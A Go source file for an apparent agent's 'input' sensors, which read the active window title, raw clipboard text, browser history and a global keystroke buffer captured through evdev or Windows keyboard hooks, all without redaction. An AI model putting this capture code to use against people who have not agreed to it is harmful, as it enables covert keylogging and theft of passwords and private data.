package agent

// Input-category sensors. OS-specific implementations live in:
//   - sensors_input_linux.go    (Linux: xdotool, xclip, evdev)
//   - sensors_input_windows.go  (Windows: GetForegroundWindow, OpenClipboard, hooks)
//   - sensors_input_darwin.go   (macOS: NSWorkspace, NSPasteboard, CGEventTap)
//
// All sensors in this category return raw platform data. There is no
// redaction, filtering, or truncation at the sensor layer — that's a
// policy decision left to flows and operators.

import (
	"context"
	"fmt"
	"runtime"
	"sync"
	"time"
)

// activeWindow reads the title of the foreground window. No special
// permissions on Linux/X11 or macOS. On Windows any process can read the
// foreground window title.
type activeWindowSensor struct{}

func (activeWindowSensor) Name() string        { return "active_window" }
func (activeWindowSensor) Category() string    { return "input" }
func (activeWindowSensor) Description() string { return "Title of the foreground window" }

func (activeWindowSensor) Read(args map[string]string) (any, error) {
	return readActiveWindowImpl()
}

// clipboardRead reads the current OS clipboard contents. Returns the raw
// string (no redaction, no truncation). On Linux uses xclip or X11
// selections; on Windows uses OpenClipboard; on macOS uses NSPasteboard.
type clipboardReadSensor struct{}

func (clipboardReadSensor) Name() string        { return "clipboard_read" }
func (clipboardReadSensor) Category() string    { return "input" }
func (clipboardReadSensor) Description() string { return "Read the OS clipboard (raw text, no redaction)" }

func (clipboardReadSensor) Read(args map[string]string) (any, error) {
	return readClipboardImpl()
}

// browserHistory reads the default browser's history database. Returns
// the most recent N visits with URL, title, visit_count, last_visit_time.
// limit defaults to 50, max 1000. No redaction — URLs are returned in full.
type browserHistorySensor struct{}

func (browserHistorySensor) Name() string { return "browser_history" }
func (browserHistorySensor) Category() string {
	return "input"
}
func (browserHistorySensor) Description() string {
	return "Most recent N visits from default browser (default 50, max 1000)"
}

func (browserHistorySensor) Read(args map[string]string) (any, error) {
	limit := 50
	if l, ok := args["limit"]; ok {
		var v int
		if _, err := fmt.Sscan(l, &v); err == nil && v > 0 {
			limit = v
		}
	}
	if limit > 1000 {
		limit = 1000
	}
	return readBrowserHistoryImpl(limit)
}

// keypressWindow is a rolling buffer of recent keystrokes captured via
// the platform's lowest-level input device API. On Linux uses evdev
// (/dev/input/eventN); on Windows uses low-level keyboard hooks. macOS
// is denied (would require accessibility permission + system extension).
//
// Args:
//   seconds: how long the buffer holds (default 30, max 600)
//   max_keys: max keys in buffer (default 500, max 10000)
//
// Returns: list of {timestamp, code, name} for each key. Code is the raw
// platform scancode; name is the resolved key name (when known).
type keypressWindowSensor struct{}

func (keypressWindowSensor) Name() string        { return "keypress_window" }
func (keypressWindowSensor) Category() string    { return "input" }
func (keypressWindowSensor) Description() string { return "Rolling buffer of recent keystrokes (Linux/Windows only)" }

func (keypressWindowSensor) Read(args map[string]string) (any, error) {
	if runtime.GOOS == "darwin" {
		return nil, fmt.Errorf("keypress_capture not supported on macOS (requires accessibility extension)")
	}
	seconds := 30
	if s, ok := args["seconds"]; ok {
		var v int
		if _, err := fmt.Sscan(s, &v); err == nil && v > 0 {
			seconds = v
		}
	}
	if seconds > 600 {
		seconds = 600
	}
	maxKeys := 500
	if m, ok := args["max_keys"]; ok {
		var v int
		if _, err := fmt.Sscan(m, &v); err == nil && v > 0 {
			maxKeys = v
		}
	}
	if maxKeys > 10000 {
		maxKeys = 10000
	}
	return readKeypressWindowImpl(seconds, maxKeys)
}

// Shared keypress buffer state. The OS-specific implementation file
// populates this via the package-internal capture goroutine. Read
// operations return a snapshot of the buffer.

var (
	keypressMu       sync.Mutex
	keypressBuffer   []keypressEvent
	keypressCapturing bool
	keypressStop      context.CancelFunc
)

type keypressEvent struct {
	Timestamp time.Time `json:"ts"`
	Code      uint16    `json:"code"`
	Name      string    `json:"name"`
}

func appendKeypressEvent(ev keypressEvent) {
	keypressMu.Lock()
	defer keypressMu.Unlock()
	keypressBuffer = append(keypressBuffer, ev)
	// Cap buffer (default 5000 events; cap raises if requested via Read)
	if len(keypressBuffer) > 10000 {
		keypressBuffer = keypressBuffer[len(keypressBuffer)-10000:]
	}
}


// Platform-agnostic keypress capture starter. Each OS-specific file
// provides a captureKeypressDevice function (one per /dev/input/eventN
// on Linux, or one for the Win32 keyboard hook on Windows). The
// ensureKeypressCapture helper iterates over the available devices and
// spawns one capture goroutine per device.
var keypressCaptureOnce sync.Once

func ensureKeypressCapture() {
	keypressCaptureOnce.Do(func() {
		for _, dev := range enumerateKeypressDevices() {
			go captureKeypressDevice(dev)
		}
	})
}


// enumerateKeypressDevices returns the list of input devices to capture
// keystrokes from. Linux: /dev/input/eventN that report EV_KEY. Windows:
// always returns a single sentinel for the global keyboard hook.
// macOS: returns nil (keypress capture is denied).

// appendKeypressEvent is the cross-platform entry point for adding
// captured keypress events to the rolling buffer. The OS-specific
// capture goroutines call this once they've parsed their native event
// record.

func snapshotKeypressWindow(seconds int, maxKeys int) []keypressEvent {
	keypressMu.Lock()
	defer keypressMu.Unlock()
	cutoff := time.Now().Add(-time.Duration(seconds) * time.Second)
	out := make([]keypressEvent, 0, len(keypressBuffer))
	for i := len(keypressBuffer) - 1; i >= 0; i-- {
		ev := keypressBuffer[i]
		if ev.Timestamp.Before(cutoff) {
			break
		}
		out = append(out, ev)
		if len(out) >= maxKeys {
			break
		}
	}
	// Reverse to chronological order
	for i, j := 0, len(out)-1; i < j; i, j = i+1, j-1 {
		out[i], out[j] = out[j], out[i]
	}
	return out
}
